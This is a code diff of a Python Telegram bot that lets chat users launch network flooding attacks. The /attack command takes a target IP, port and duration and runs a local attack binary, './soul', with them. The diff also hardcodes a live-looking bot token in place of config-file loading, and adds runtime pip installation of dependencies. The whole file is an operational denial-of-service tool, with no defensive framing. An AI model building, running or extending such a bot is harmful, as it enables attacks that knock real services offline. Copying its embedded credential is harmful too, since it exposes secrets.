@@ -1,22 +1,36 @@
-import os
-import json
-import telebot
+import subprocess
+import sys
 import logging
+
+# Required dependencies
+REQUIRED_MODULES = [
+    "telebot==0.0.4",
+    "asyncio",
+    "ipaddress"
+]
+
+def install_missing_modules():
+    """Ensure all required modules are installed."""
+    for module in REQUIRED_MODULES:
+        try:
+            __import__(module)
+        except ImportError:
+            logging.warning(f"Module {module} not found. Installing...")
+            subprocess.check_call([sys.executable, "-m", "pip", "install", module])
+
+# Install missing modules before running the bot
+install_missing_modules()
+
+# Main script logic
+import os
+import telebot
 import time
 import asyncio
 import threading
 import ipaddress
 
-# Load Bot Token from Configuration File
-try:
-    with open('config.json', 'r') as config_file:
-        config = json.load(config_file)
-        TOKEN = config.get('TOKEN')
-        if not TOKEN:
-            raise ValueError("Bot token not found in config.json.")
-except (FileNotFoundError, json.JSONDecodeError):
-    raise ValueError("Error loading config.json. Make sure the file exists and is valid.")
-
+# Bot Token
+TOKEN = '5299697243:AAHL3WvNyXjgrzuT7FE0-2YQO5-uTiXWWmM'  # Replace with your bot token
 bot = telebot.TeleBot(TOKEN)
 
 # Logging Configuration
@@ -37,22 +51,19 @@ blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 # Async Loop
 loop = asyncio.new_event_loop()
 
-
 async def start_asyncio_loop():
     while True:
         await asyncio.sleep(REQUEST_INTERVAL)
 
-
 async def run_attack_command_async(target_ip, target_port, duration):
     try:
-        process = await asyncio.create_subprocess_shell(f"./hkr {target_ip} {target_port} {duration} 200")
+        process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 200")
         await process.communicate()
     except Exception as e:
         logging.error(f"Error during attack execution: {e}")
     finally:
         with lock:
             bot.attack_in_progress = False
-
 
 @bot.message_handler(commands=['attack'])
 def handle_attack_command(message):
@@ -69,7 +80,6 @@ def handle_attack_command(message):
                                "*Please provide the target IP, port, and duration in seconds.*\n"
                                "*Example: 167.67.25 6296 60*", parse_mode='Markdown')
     bot.register_next_step_handler(message, process_attack_command)
-
 
 def process_attack_command(message):
     try:
@@ -111,7 +121,6 @@ def process_attack_command(message):
         logging.error(f"Error in processing attack command: {e}")
         bot.send_message(message.chat.id, "*❌ An error occurred while processing your request.*", parse_mode='Markdown')
 
-
 @bot.message_handler(commands=['when'])
 def when_command(message):
     chat_id = message.chat.id
@@ -127,7 +136,6 @@ def when_command(message):
         else:
             bot.send_message(chat_id, "*❌ No attack is currently in progress!*", parse_mode='Markdown')
 
-
 @bot.message_handler(commands=['start'])
 def start_message(message):
     try:
@@ -137,11 +145,9 @@ def start_message(message):
     except Exception as e:
         logging.error(f"Error in start command: {e}")
 
-
 def start_asyncio_thread():
     asyncio.set_event_loop(loop)
     loop.run_until_complete(start_asyncio_loop())
-
 
 # Start the bot
 if __name__ == "__main__":
